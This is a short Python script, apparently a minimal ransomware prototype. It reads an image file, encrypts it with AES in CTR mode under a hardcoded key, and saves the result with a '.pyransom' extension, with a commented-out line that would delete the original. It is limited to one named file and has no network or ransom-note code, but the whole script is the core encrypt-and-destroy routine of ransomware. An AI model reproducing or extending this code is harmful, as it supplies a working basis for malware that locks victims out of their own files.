import os

import pyaes

# Open file
file_name = "foto.jpg"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remove file
#os.remove(file_name)

# Crypt file data (Using AES)
key = "0123456789abcdef"  # 16 bytes key - change for your key
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# Save file
new_file_name = file_name + ".pyransom"  # Path to drop file
new_file = open(new_file_name, 'wb')
new_file.write(crypto_data)
new_file.close()
